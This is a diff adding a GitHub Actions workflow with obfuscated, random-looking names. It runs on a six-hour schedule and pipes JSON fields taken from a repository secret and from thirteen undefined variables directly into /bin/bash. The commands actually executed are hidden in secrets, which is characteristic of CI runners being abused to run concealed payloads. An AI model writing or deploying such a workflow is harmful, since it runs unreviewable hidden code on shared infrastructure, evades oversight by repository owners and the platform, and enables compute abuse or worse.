@@ -1,0 +1,30 @@
+name: kutibuxue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kutibuxue
+        env:
+          vutpm24566: ${{ secrets.vutpm24566 }}
+        run: |
+          echo $vutpm24566 | jq -r .wt42873 | /bin/bash
+          echo $ble3 | jq -r .ub07431 | /bin/bash
+          echo $nqydg844 | jq -r .tc46 | /bin/bash
+          echo $qha74 | jq -r .nufxh6706 | /bin/bash
+          echo $lvut3956 | jq -r .h094 | /bin/bash
+          echo $a152 | jq -r .sztc3 | /bin/bash
+          echo $hral01424 | jq -r .qmc551 | /bin/bash
+          echo $ku1 | jq -r .oktgj72217 | /bin/bash
+          echo $j01 | jq -r .j5126 | /bin/bash
+          echo $qv4 | jq -r .lusp9676 | /bin/bash
+          echo $k01 | jq -r .ms87 | /bin/bash
+          echo $rmtc48450 | jq -r .ryqm14 | /bin/bash
+          echo $l331 | jq -r .oca24 | /bin/bash
+          echo $ejaih94259 | jq -r .uvxc72074 | /bin/bash
+
